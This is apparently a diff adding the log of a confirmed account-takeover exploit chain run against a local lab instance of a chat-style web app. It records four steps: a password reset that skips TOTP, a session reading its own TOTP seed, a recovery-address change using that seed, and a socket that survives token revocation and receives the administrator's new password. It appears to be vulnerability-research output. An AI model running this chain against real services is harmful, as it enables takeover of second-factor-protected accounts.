@@ -1,0 +1,23 @@
+========================================================================
+CHAIN-001: one captured reset link -> permanent ownership of a TOTP-protected account
+target : http://127.0.0.1:39649
+author : Blue Spider
+========================================================================
+[INFO] chaining VULN-015 (reset skips the second factor) -> VULN-004 (the session reads its own TOTP seed) -> the email-change step-up -> VULN-033 (the socket survives remediation)
+[SETUP] vic_5d7a3bf5 <vic_5d7a3bf5@lab.invalid> enrolled in TOTP; a password login now answers HTTP 401 totp-required
+[STEP] 1/4 VULN-015: anonymous users.forgotPassword for vic_5d7a3bf5@lab.invalid
+[STEP]     reset link captured from the mailbox (HTTP 200): token hnf1Qb1qL7...
+[PROOF]     the reset handed back a working session with no TOTP code: /api/v1/me HTTP 200 as vic_5d7a3bf5
+[STEP] 2/4 VULN-004: users.info for the caller's own id, with the stolen session
+[PROOF]     services.totp.secret=NQSTMQJDJV4D... plus 12 backup-code hashes: the second factor is now the attacker's, offline and for ever (matches the enrolled seed=True)
+[STEP] 3/4 feature: move the account's recovery address to atk_5d7a3bf5@lab.invalid, satisfying the second-factor step-up with a code derived from the stolen seed
+[PROOF]     HTTP 200: the account's address is now atk_5d7a3bf5@lab.invalid
+[INFO]     (the 2 earlier mail(s) to the victim's address were cleared from the sink first, so this second question is answered on its own)
+[PROOF]     a fresh reset mail for the account arrived at the attacker's mailbox (token nG4ZxUkCXV...), while the victim's own address produced none (HTTP 200, token=None): the recovery channel is the attacker's
+[STEP] 4/4 VULN-033: hold the stolen session's socket open across the remediation
+[SETUP]     attacker socket subscribed: notification -> ready, userData -> ready
+[PROOF]     after users.removeOtherTokens (HTTP 200) the socket is still alive=True; the administrator's reset (HTTP 200) arrived on it in clear: 'Admin-Reset-5d7a3bf5!7x'
+[PROOF]     logging in with the administrator's new password and a code from the stolen seed: HTTP 200 success=True
+[INFO] cleanup: deleting the victim account this run created and clearing its mail
+[OK] CHAIN-001 CONFIRMED
+==> CHAIN-001 CONFIRMED 2026-11-24 - one captured reset link produced a session without the second factor, that session read the account's TOTP seed, the seed passed the step-up that moved the recovery address to the attacker, and the attacker's socket survived the remediation and received the administrator's new password in clear
